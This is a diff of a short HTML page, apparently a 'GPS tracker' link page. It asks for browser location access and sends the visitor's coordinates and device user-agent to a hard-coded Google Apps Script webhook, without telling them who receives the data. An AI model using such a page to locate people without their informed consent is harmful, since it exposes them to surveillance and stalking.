@@ -1,45 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>GPS Email Tracker</title>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-</head>
+<head><title>GPS Tracker</title></head>
 <body>
-  <h2 id="status">Loading, please allow location access...</h2>
+  <h2 id="status">Requesting location permission...</h2>
 
   <script>
     const webhookURL = "https://script.google.com/macros/s/AKfycbyWzAfLgQDQPzlPnoJxhwvKVnYAgeUVpCIx-dy4qPa2mqU-yHCC2MlZY-N2Trdr8w2XBA/exec";
 
-    function sendLocation(lat, lon, device) {
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({lat: lat, lon: lon, device: device})
-      })
-      .then(response => response.text())
-      .then(data => {
-        document.getElementById("status").textContent = "Location sent successfully! You can close this tab.";
-      })
-      .catch(err => {
-        document.getElementById("status").textContent = "Error sending location: " + err;
-      });
-    }
-
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const device = navigator.userAgent;
-          sendLocation(lat, lon, device);
+        function(position) {
+          document.getElementById('status').textContent = 'Location permission granted.';
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              device: navigator.userAgent
+            })
+          })
+          .then(() => document.getElementById('status').textContent = 'Location sent successfully.')
+          .catch(() => document.getElementById('status').textContent = 'Error sending location.');
         },
-        (error) => {
-          document.getElementById("status").textContent = "Permission denied or location unavailable.";
+        function(error) {
+          document.getElementById('status').textContent = 'Location permission denied or error.';
         }
       );
     } else {
-      document.getElementById("status").textContent = "Geolocation is not supported by this browser.";
+      document.getElementById('status').textContent = 'Geolocation is not supported.';
     }
   </script>
 </body>
